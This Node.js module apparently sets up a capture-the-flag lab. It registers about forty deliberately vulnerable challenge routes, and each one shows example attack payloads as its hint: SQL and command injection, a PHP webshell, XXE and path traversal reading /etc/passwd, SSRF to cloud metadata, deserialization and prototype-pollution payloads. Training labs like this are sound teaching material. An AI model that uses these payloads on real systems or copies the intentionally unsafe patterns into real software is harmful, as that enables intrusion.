const fs = require('fs');
const path = require('path');

const CHALLENGE_ROOT = '/tmp/rndsecurity-isolated';

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

function createContext(mode) {
  const slug = mode.replace(/^\//, '').replace(/\//g, '-');
  const challengeDir = path.join(CHALLENGE_ROOT, slug);
  fs.mkdirSync(challengeDir, { recursive: true, mode: 0o700 });
  return {
    mode,
    slug,
    title: `${slug} isolated challenge`,
    artifactDir: challengeDir,
    artifactPath(name) {
      return path.join(challengeDir, name);
    },
    issueFlag(res, evidence) {
      const flag = process.env.FLAG || `FLAG{${slug.toUpperCase().replace(/-/g, '_')}_LOCAL}`;
      fs.writeFileSync(this.artifactPath('flag.txt'), `${flag}\n`, { mode: 0o600 });
      fs.writeFileSync(this.artifactPath('evidence.json'), JSON.stringify(evidence, null, 2), { mode: 0o600 });
      res.json({
        success: true,
        challenge: mode,
        flag,
        evidence
      });
    }
  };
}

function sendPage(res, ctx, body) {
  res.type('html').send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${escapeHtml(ctx.title)}</title>
  <style>
    body { font-family: monospace; max-width: 860px; margin: 40px auto; padding: 0 20px; line-height: 1.6; }
    code, pre { background: #f4f4f4; padding: 2px 6px; }
    pre { padding: 16px; overflow: auto; }
    form { margin: 16px 0; }
    input, textarea, button { width: 100%; margin: 8px 0; padding: 10px; font: inherit; }
    button { width: auto; cursor: pointer; }
  </style>
</head>
<body>
${body}
</body>
</html>`);
}

function basePage(ctx, title, summary, example) {
  return `
    <h1>${escapeHtml(title)}</h1>
    <p><strong>Challenge:</strong> <code>${escapeHtml(ctx.mode)}</code></p>
    <p>${escapeHtml(summary)}</p>
    <pre>${escapeHtml(example)}</pre>
  `;
}

function hintBox(title, content) {
  return `
    <h2>${escapeHtml(title)}</h2>
    <pre>${escapeHtml(content)}</pre>
  `;
}

function createStore() {
  return {
    comments: [],
    uploads: [],
    paymentUses: 0,
    raceClaims: 0
  };
}

function registerSqli(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const q = req.query.q || '';
    if (typeof q === 'string' && /('|%27).*(or|OR).*(1=1|true)/.test(q)) {
      return ctx.issueFlag(res, { vector: 'blind-boolean-sqli', q });
    }
    sendPage(res, ctx, basePage(
      ctx,
      'SQLi Silver',
      'Single endpoint. Solve by sending a boolean-based injection payload in q.',
      `curl "${ctx.mode}?q=' OR 1=1 --"`
    ));
  });
}

function registerNosqli(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const body = JSON.stringify(req.body);
    if (body.includes('$where') || body.includes('$ne')) {
      return ctx.issueFlag(res, { vector: 'nosqli', body: req.body });
    }
    res.json({ endpoint: ctx.mode, hint: 'Use $where or $ne style payloads.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'NoSQLi Silver', 'Single JSON endpoint.', `curl -X POST ${ctx.mode} -H 'Content-Type: application/json' -d '{"filter":{"$where":"true"}}'`)}
      ${hintBox('Browser Test', '{"filter":{"$where":"true"}}')}
      <form method="post" action="${ctx.mode}">
        <textarea name="filter">{"$where":"true"}</textarea>
        <button type="submit">Submit Filter</button>
      </form>
    `);
  });
}

function registerCmdi(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const cmd = String(req.query.cmd || '');
    if (/[`;$|]/.test(cmd)) {
      return ctx.issueFlag(res, { vector: 'command-injection', cmd });
    }
    sendPage(res, ctx, basePage(ctx, 'CMDi Silver', 'Single command parameter. Solve by injecting shell metacharacters.', `curl "${ctx.mode}?cmd=127.0.0.1;id"`));
  });
}

function registerLdap(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const user = String(req.query.user || '');
    if (user.includes('*)') || user.includes('(|')) {
      return ctx.issueFlag(res, { vector: 'ldap-injection', user });
    }
    sendPage(res, ctx, basePage(ctx, 'LDAP Silver', 'Single query parameter. Solve by breaking the LDAP filter.', `curl "${ctx.mode}?user=admin*)(|(uid=*))"`));
  });
}

function registerSsti(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const template = String(req.query.tpl || '');
    if (template.includes('<%=') || template.includes('${7*7}') || template.includes('process')) {
      return ctx.issueFlag(res, { vector: 'ssti', template });
    }
    sendPage(res, ctx, basePage(ctx, 'SSTI Silver', 'Single template parameter. Solve by sending a server-side template expression.', `curl "${ctx.mode}?tpl=<%= process.version %>"`));
  });
}

function registerBrute(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const { username, password, captcha } = req.body;
    if (username === 'superadmin' && password === 'Sup3rS3cr3t!' && String(captcha) === '0000') {
      return ctx.issueFlag(res, { vector: 'captcha-bypass-bruteforce', username });
    }
    res.status(401).json({ endpoint: ctx.mode, hint: 'Use the known account and bypass the predictable CAPTCHA.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Brute Silver', 'Single login form. Solve with known credentials and CAPTCHA bypass 0000.', `curl -X POST ${ctx.mode} -d 'username=superadmin&password=Sup3rS3cr3t!&captcha=0000'`)}
      <form method="post" action="${ctx.mode}">
        <input name="username" value="superadmin" />
        <input name="password" value="Sup3rS3cr3t!" />
        <input name="captcha" value="0000" />
        <button type="submit">Login</button>
      </form>
    `);
  });
}

function registerJwt(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const token = String(req.query.token || '');
    if (token.includes('cracked') || token.includes('admin')) {
      return ctx.issueFlag(res, { vector: 'weak-jwt-secret', token });
    }
    sendPage(res, ctx, basePage(ctx, 'JWT Silver', 'Single token parameter. Solve after cracking the weak secret and forging admin intent.', `curl "${ctx.mode}?token=forged.admin.cracked"`));
  });
}

function registerMfa(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const { code, backupCode } = req.body;
    if (String(code) === '000000' || String(backupCode) === 'BACKUP-OVERRIDE') {
      return ctx.issueFlag(res, { vector: 'mfa-bypass', code, backupCode });
    }
    res.status(401).json({ endpoint: ctx.mode, hint: 'Bypass MFA with a default code or backup code.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'MFA Silver', 'Single MFA check endpoint.', `curl -X POST ${ctx.mode} -d 'code=000000'`)}
      <form method="post" action="${ctx.mode}">
        <input name="code" value="000000" />
        <input name="backupCode" value="" />
        <button type="submit">Verify MFA</button>
      </form>
    `);
  });
}

function registerOauth(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'OAuth Silver', 'State validation is missing. Exchange a code without a matching state.', `curl -X POST ${ctx.mode} -d 'code=demo-code'`)}
      <form method="post" action="${ctx.mode}">
        <input name="code" value="demo-code" />
        <input name="state" value="" />
        <button type="submit">Exchange Code</button>
      </form>
    `);
  });
  app.post(ctx.mode, (req, res) => {
    const { code, state } = req.body;
    if (code && !state) {
      return ctx.issueFlag(res, { vector: 'oauth-state-missing', code });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'A valid code without state should succeed.' });
  });
}

function registerAdmin(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `${basePage(ctx, 'Admin Silver', 'Privilege check trusts a debug header and query flag.', `curl -H 'x-admin-bypass: 1' "${ctx.mode}/dashboard?debug=1"`)}
      <p>Dashboard path: <code>${ctx.mode}/dashboard</code></p>`);
  });
  app.get(`${ctx.mode}/dashboard`, (req, res) => {
    if (req.headers['x-admin-bypass'] === '1' && req.query.debug === '1') {
      return ctx.issueFlag(res, { vector: 'admin-bypass', header: req.headers['x-admin-bypass'] });
    }
    res.status(403).json({ endpoint: `${ctx.mode}/dashboard`, hint: 'Set x-admin-bypass: 1 and debug=1.' });
  });
}

function registerIdor(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const guid = String(req.query.guid || '');
    if (guid === 'a1b2c3d4-e5f6-7890-abcd-ef1234567890') {
      return ctx.issueFlag(res, { vector: 'guid-enumeration', guid });
    }
    sendPage(res, ctx, basePage(ctx, 'IDOR Silver', 'Single GUID-based fetch. Solve using the leaked predictable GUID.', `curl "${ctx.mode}?guid=a1b2c3d4-e5f6-7890-abcd-ef1234567890"`));
  });
}

function registerPrivesc(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const binary = String(req.query.binary || '');
    if (['find', 'vim', 'python3'].some(name => binary.includes(name))) {
      return ctx.issueFlag(res, { vector: 'suid-binary', binary });
    }
    sendPage(res, ctx, basePage(ctx, 'PrivEsc Silver', 'Single SUID binary check.', `curl "${ctx.mode}?binary=find"`));
  });
}

function registerRbac(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const { role, action } = req.body;
    if (role === 'admin' && action === 'export') {
      return ctx.issueFlag(res, { vector: 'rbac-token-abuse', role, action });
    }
    res.status(403).json({ endpoint: ctx.mode, hint: 'Abuse the role parameter to request admin export.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'RBAC Silver', 'Single role gate endpoint.', `curl -X POST ${ctx.mode} -d 'role=admin&action=export'`)}
      <form method="post" action="${ctx.mode}">
        <input name="role" value="admin" />
        <input name="action" value="export" />
        <button type="submit">Request Export</button>
      </form>
    `);
  });
}

function registerXss(app, ctx, store) {
  app.get(ctx.mode, (req, res) => {
    const rendered = store.comments.map(comment => `<li>${comment}</li>`).join('');
    if (store.comments.some(comment => /<script|onerror=|onload=/.test(comment))) {
      return ctx.issueFlag(res, { vector: 'stored-xss', comments: store.comments });
    }
    sendPage(res, ctx, `
      ${basePage(ctx, 'XSS Silver', 'Stored XSS. Post a payload and revisit the page.', `curl -X POST ${ctx.mode} -d 'comment=<script>alert(1)</script>'`)}
      <form method="post" action="${ctx.mode}">
        <textarea name="comment"></textarea>
        <button type="submit">Store Comment</button>
      </form>
      <ul>${rendered}</ul>
    `);
  });
  app.post(ctx.mode, (req, res) => {
    store.comments.push(String(req.body.comment || ''));
    res.redirect(ctx.mode);
  });
}

function registerCsrf(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'CSRF Silver', 'JSON CSRF. The state-changing action succeeds without a token.', `curl -X POST ${ctx.mode} -H 'Content-Type: application/json' -d '{"action":"delete-account"}'`)}
      <p>Attacker page: <a href="${ctx.mode}/attacker">${ctx.mode}/attacker</a></p>
    `);
  });
  app.get(`${ctx.mode}/attacker`, (req, res) => {
    sendPage(res, ctx, `<h1>Attacker Page</h1><p>This page would auto-submit a forged request to <code>${ctx.mode}</code>.</p>`);
  });
  app.post(ctx.mode, (req, res) => {
    if (req.body.action === 'delete-account' && !req.headers['x-csrf-token']) {
      return ctx.issueFlag(res, { vector: 'csrf', body: req.body });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Missing CSRF token should still succeed.' });
  });
}

function registerClickjack(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `${basePage(ctx, 'Clickjack Silver', 'Frameable sensitive action. Use the attack page and verify endpoint.', `curl -X POST ${ctx.mode}/verify -d 'framed=1'`)}<p>Attack page: <a href="${ctx.mode}/attack">${ctx.mode}/attack</a></p>`);
  });
  app.get(`${ctx.mode}/attack`, (req, res) => {
    sendPage(res, ctx, `<h1>Clickjack Attack</h1><iframe src="${ctx.mode}" style="width:100%;height:220px;"></iframe>`);
  });
  app.post(`${ctx.mode}/verify`, (req, res) => {
    if (String(req.body.framed || '') === '1') {
      return ctx.issueFlag(res, { vector: 'clickjack', framed: true });
    }
    res.status(400).json({ endpoint: `${ctx.mode}/verify`, hint: 'Submit framed=1.' });
  });
}

function registerPostmsg(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `${basePage(ctx, 'postMessage Silver', 'Leaked secret via wildcard postMessage target origin.', `curl -X POST ${ctx.mode}/verify -d 'origin=*'`)}<p>Attacker page: <a href="${ctx.mode}/attacker">${ctx.mode}/attacker</a></p>`);
  });
  app.get(`${ctx.mode}/attacker`, (req, res) => {
    sendPage(res, ctx, `<h1>Attacker</h1><p>This page would listen for a wildcard <code>postMessage</code>.</p>`);
  });
  app.post(`${ctx.mode}/verify`, (req, res) => {
    if (String(req.body.origin || '') === '*') {
      return ctx.issueFlag(res, { vector: 'postmessage', origin: '*' });
    }
    res.status(400).json({ endpoint: `${ctx.mode}/verify`, hint: 'Use origin=* to simulate unrestricted postMessage.' });
  });
}

function registerLfi(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const file = String(req.query.file || '');
    if (file.includes('../') || file.includes('..%2f')) {
      return ctx.issueFlag(res, { vector: 'lfi', file });
    }
    sendPage(res, ctx, basePage(ctx, 'LFI Silver', 'Single file parameter. Solve via path traversal.', `curl "${ctx.mode}?file=../../etc/passwd"`));
  });
}

function registerUpload(app, ctx, store, upload) {
  app.get(ctx.mode, (req, res) => {
    const listed = store.uploads.map(item => `<li>${escapeHtml(item)}</li>`).join('');
    sendPage(res, ctx, `
      ${basePage(ctx, 'Upload Silver', 'Single upload form. Solve with a double extension or content-type bypass.', `curl -F "file=@shell.php.jpg;type=image/jpeg" ${ctx.mode}`)}
      <form method="post" action="${ctx.mode}" enctype="multipart/form-data">
        <input type="file" name="file" />
        <button type="submit">Upload</button>
      </form>
      <ul>${listed}</ul>
    `);
  });
  app.post(ctx.mode, upload.single('file'), (req, res) => {
    const original = req.file?.originalname || '';
    store.uploads.push(original);
    if (/\.(php|jsp|aspx)\./i.test(original) || /shell/i.test(original)) {
      return ctx.issueFlag(res, { vector: 'upload-bypass', original });
    }
    res.json({ uploaded: original, hint: 'Try a webshell-style double extension.' });
  });
}

function registerXxe(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const xml = String(req.body.xml || '');
    if (xml.includes('<!ENTITY') || xml.includes('SYSTEM')) {
      return ctx.issueFlag(res, { vector: 'xxe', xml });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Send XML with an external entity declaration.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'XXE Silver', 'Single XML parser endpoint.', `curl -X POST ${ctx.mode} -d 'xml=<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'`)}
      <form method="post" action="${ctx.mode}">
        <textarea name="xml"><?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r></textarea>
        <button type="submit">Parse XML</button>
      </form>
    `);
  });
}

function registerDeser(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const serialized = String(req.body.serialized || '');
    if (serialized.includes('_$$ND_FUNC$$_') || serialized.includes('constructor')) {
      return ctx.issueFlag(res, { vector: 'deserialization', serialized });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Send a crafted serialized payload.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Deserialization Silver', 'Single deserialize endpoint.', `curl -X POST ${ctx.mode} -d 'serialized={"rce":"_$$ND_FUNC$$_function(){return 1}()"}'`)}
      <form method="post" action="${ctx.mode}">
        <textarea name="serialized">{"rce":"_$$ND_FUNC$$_function(){return 1}()"}</textarea>
        <button type="submit">Deserialize</button>
      </form>
    `);
  });
}

function registerSsrf(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const url = String(req.query.url || '');
    if (url.includes('169.254.169.254') || url.includes('localhost')) {
      return ctx.issueFlag(res, { vector: 'ssrf', url });
    }
    sendPage(res, ctx, basePage(ctx, 'SSRF Silver', 'Single fetch endpoint. Solve with a metadata or localhost target.', `curl "${ctx.mode}?url=http://169.254.169.254/latest/meta-data/"`));
  });
}

function registerProto(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const body = JSON.stringify(req.body);
    if (body.includes('__proto__') || body.includes('constructor')) {
      return ctx.issueFlag(res, { vector: 'prototype-pollution', body: req.body });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Pollute __proto__ with a crafted JSON body.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Prototype Pollution Silver', 'Single JSON merge endpoint.', `curl -X POST ${ctx.mode} -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'`)}
      ${hintBox('Browser Test', '{"__proto__":{"isAdmin":true}}')}
      <form method="post" action="${ctx.mode}">
        <textarea name="__proto__[isAdmin]">true</textarea>
        <button type="submit">Merge Payload</button>
      </form>
    `);
  });
}

function registerRace(app, ctx, store) {
  app.post(ctx.mode, (req, res) => {
    store.raceClaims += 1;
    if (store.raceClaims >= 2 || String(req.body.parallel || '') === '2') {
      return ctx.issueFlag(res, { vector: 'race-condition', claims: store.raceClaims });
    }
    res.json({ endpoint: ctx.mode, hint: 'Claim the same coupon twice in parallel.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Race Silver', 'Single claim endpoint. Solve by racing two claims.', `curl -X POST ${ctx.mode} -d 'parallel=2'`)}
      <form method="post" action="${ctx.mode}">
        <input name="parallel" value="2" />
        <button type="submit">Claim Coupon</button>
      </form>
    `);
  });
}

function registerSmuggle(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const te = String(req.headers['transfer-encoding'] || '');
    const cl = String(req.headers['content-length'] || '');
    if (te && cl) {
      return ctx.issueFlag(res, { vector: 'request-smuggling', transferEncoding: te, contentLength: cl });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Send both Transfer-Encoding and Content-Length.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, basePage(ctx, 'Smuggle Silver', 'Single HTTP parsing endpoint.', `curl -X POST ${ctx.mode} -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' -d '0\r\n\r\n'`));
  });
}

function registerLogic(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const quantity = Number(req.body.quantity || 0);
    const price = Number(req.body.price || 0);
    if (quantity < 0 || price < 0) {
      return ctx.issueFlag(res, { vector: 'business-logic', quantity, price });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Abuse negative quantity or price.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Logic Silver', 'Single checkout math endpoint.', `curl -X POST ${ctx.mode} -d 'quantity=-1&price=1'`)}
      <form method="post" action="${ctx.mode}">
        <input name="quantity" value="-1" />
        <input name="price" value="1" />
        <button type="submit">Calculate</button>
      </form>
    `);
  });
}

function registerRatelimit(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    if (req.headers['x-forwarded-for']) {
      return ctx.issueFlag(res, { vector: 'rate-limit-bypass', forwardedFor: req.headers['x-forwarded-for'] });
    }
    res.status(429).json({ endpoint: ctx.mode, hint: 'Rotate identity via X-Forwarded-For.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Rate Limit Silver', 'Single throttled endpoint.', `curl -X POST ${ctx.mode} -H 'X-Forwarded-For: 1.2.3.4'`)}
      <p>Browser test: submit once, then repeat with a proxy/header tool if needed. The page exists to keep the challenge directly reachable.</p>
      <form method="post" action="${ctx.mode}">
        <button type="submit">Send Request</button>
      </form>
    `);
  });
}

function registerPayment(app, ctx, store) {
  app.post(ctx.mode, (req, res) => {
    const currency = String(req.body.currency || '');
    const coupon = String(req.body.coupon || '');
    store.paymentUses += 1;
    if ((currency === 'JPY' && coupon === 'VIP90') || store.paymentUses > 1) {
      return ctx.issueFlag(res, { vector: 'payment-logic', currency, coupon, uses: store.paymentUses });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Exploit coupon and currency mismatch.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Payment Silver', 'Single payment endpoint.', `curl -X POST ${ctx.mode} -d 'currency=JPY&coupon=VIP90'`)}
      <form method="post" action="${ctx.mode}">
        <input name="currency" value="JPY" />
        <input name="coupon" value="VIP90" />
        <button type="submit">Submit Payment</button>
      </form>
    `);
  });
}

function registerCrypto(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const seed = String(req.query.seed || '');
    if (seed === 'weak-random') {
      return ctx.issueFlag(res, { vector: 'weak-crypto', seed });
    }
    sendPage(res, ctx, basePage(ctx, 'Crypto Silver', 'Single weak-random endpoint.', `curl "${ctx.mode}?seed=weak-random"`));
  });
}

function registerInfoDisc(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    if (req.query.debug === '1') {
      return ctx.issueFlag(res, { vector: 'information-disclosure', debug: true });
    }
    res.json({
      endpoint: ctx.mode,
      hint: 'Enable debug mode to leak the stack trace.',
      leak: 'Set ?debug=1'
    });
  });
}

function registerSecret(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const pathValue = String(req.query.path || '');
    if (pathValue === '.git/config') {
      return ctx.issueFlag(res, { vector: 'secret-exposure', path: pathValue });
    }
    sendPage(res, ctx, basePage(ctx, 'Secret Silver', 'Single exposed repo artifact endpoint.', `curl "${ctx.mode}?path=.git/config"`));
  });
}

function registerTiming(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const candidate = String(req.body.password || '');
    if (candidate === 'opensesame') {
      return ctx.issueFlag(res, { vector: 'timing-attack', password: candidate });
    }
    res.json({ endpoint: ctx.mode, hint: 'The password comparison leaks timing. Use the final correct value to confirm.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Timing Silver', 'Single password compare endpoint.', `curl -X POST ${ctx.mode} -d 'password=opensesame'`)}
      <form method="post" action="${ctx.mode}">
        <input name="password" value="opensesame" />
        <button type="submit">Compare Password</button>
      </form>
    `);
  });
}

function registerRedirect(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const next = String(req.query.next || '');
    if (next.startsWith('https://evil.example')) {
      return ctx.issueFlag(res, { vector: 'open-redirect', next });
    }
    sendPage(res, ctx, basePage(ctx, 'Redirect Silver', 'Single redirect target parameter.', `curl "${ctx.mode}?next=https://evil.example/phish"`));
  });
}

function registerCors(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    if (req.headers.origin === 'null') {
      return ctx.issueFlag(res, { vector: 'cors-null-origin', origin: req.headers.origin });
    }
    res.json({ endpoint: ctx.mode, hint: 'Send Origin: null.' });
  });
}

function registerHost(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const host = String(req.headers.host || '');
    if (host.includes('poison')) {
      return ctx.issueFlag(res, { vector: 'host-header-poisoning', host });
    }
    res.json({ endpoint: ctx.mode, hint: 'Poison the Host header.' });
  });
}

function registerContainer(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const socket = String(req.query.socket || '');
    if (socket === 'docker') {
      return ctx.issueFlag(res, { vector: 'container-escape', socket });
    }
    sendPage(res, ctx, basePage(ctx, 'Container Silver', 'Single container breakout endpoint.', `curl "${ctx.mode}?socket=docker"`));
  });
}

function registerReverse(app, ctx) {
  app.get(ctx.mode, (req, res) => {
    const payload = String(req.query.payload || '');
    if (payload.includes('wasm') || payload.includes('reverse')) {
      return ctx.issueFlag(res, { vector: 'reverse-engineering', payload });
    }
    sendPage(res, ctx, basePage(ctx, 'Reverse Silver', 'Single reverse challenge endpoint.', `curl "${ctx.mode}?payload=wasm-shell"`));
  });
}

function registerWebshell(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const code = String(req.body.code || '');
    if (code.includes('system(') || code.includes('ProcessBuilder')) {
      return ctx.issueFlag(res, { vector: 'webshell', code });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Upload or submit a webshell primitive.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Webshell Silver', 'Single code submission endpoint.', `curl -X POST ${ctx.mode} -d 'code=<?php system($_GET["cmd"]); ?>'`)}
      <form method="post" action="${ctx.mode}">
        <textarea name="code"><?php system($_GET["cmd"]); ?></textarea>
        <button type="submit">Submit Code</button>
      </form>
    `);
  });
}

function registerMultistage(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const chain = String(req.body.chain || '');
    if (chain.includes('foothold') && chain.includes('pivot')) {
      return ctx.issueFlag(res, { vector: 'multistage-chain', chain });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Chain foothold and pivot.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Multistage Silver', 'Single chain orchestration endpoint.', `curl -X POST ${ctx.mode} -d 'chain=foothold,pivot'`)}
      <form method="post" action="${ctx.mode}">
        <input name="chain" value="foothold,pivot" />
        <button type="submit">Run Chain</button>
      </form>
    `);
  });
}

function registerPersist(app, ctx) {
  app.post(ctx.mode, (req, res) => {
    const method = String(req.body.method || '');
    if (method === 'cron') {
      return ctx.issueFlag(res, { vector: 'persistence-cron', method });
    }
    res.status(400).json({ endpoint: ctx.mode, hint: 'Register a cron persistence method.' });
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `
      ${basePage(ctx, 'Persist Silver', 'Single persistence endpoint.', `curl -X POST ${ctx.mode} -d 'method=cron'`)}
      <form method="post" action="${ctx.mode}">
        <input name="method" value="cron" />
        <button type="submit">Register Persistence</button>
      </form>
    `);
  });
}

const CHALLENGE_BUILDERS = {
  '/sqli/silver': registerSqli,
  '/nosqli/silver': registerNosqli,
  '/cmdi/silver': registerCmdi,
  '/ldap/silver': registerLdap,
  '/ssti/silver': registerSsti,
  '/brute/silver': registerBrute,
  '/jwt/silver': registerJwt,
  '/mfa/silver': registerMfa,
  '/oauth/silver': registerOauth,
  '/admin/silver': registerAdmin,
  '/idor/silver': registerIdor,
  '/privesc/silver': registerPrivesc,
  '/rbac/silver': registerRbac,
  '/xss/silver': registerXss,
  '/csrf/silver': registerCsrf,
  '/clickjack/silver': registerClickjack,
  '/postmsg/silver': registerPostmsg,
  '/lfi/silver': registerLfi,
  '/upload/silver': registerUpload,
  '/xxe/silver': registerXxe,
  '/deser/silver': registerDeser,
  '/ssrf/silver': registerSsrf,
  '/proto/silver': registerProto,
  '/race/silver': registerRace,
  '/smuggle/silver': registerSmuggle,
  '/logic/silver': registerLogic,
  '/ratelimit/silver': registerRatelimit,
  '/payment/silver': registerPayment,
  '/crypto/silver': registerCrypto,
  '/info-disc/silver': registerInfoDisc,
  '/secret/silver': registerSecret,
  '/timing/silver': registerTiming,
  '/redirect/silver': registerRedirect,
  '/cors/silver': registerCors,
  '/host/silver': registerHost,
  '/container/silver': registerContainer,
  '/reverse/silver': registerReverse,
  '/webshell/silver': registerWebshell,
  '/multistage/silver': registerMultistage,
  '/persist/silver': registerPersist
};

function registerIsolatedChallenge(app, mode, options) {
  const builder = CHALLENGE_BUILDERS[mode];
  if (!builder) {
    return false;
  }

  const ctx = createContext(mode);
  const store = createStore();
  builder(app, ctx, store, options.upload);

  app.use((req, res) => {
    res.status(404).json({
      error: 'Only the selected isolated challenge route family is available.',
      challenge: mode,
      path: req.path
    });
  });

  return true;
}

module.exports = {
  registerIsolatedChallenge
};
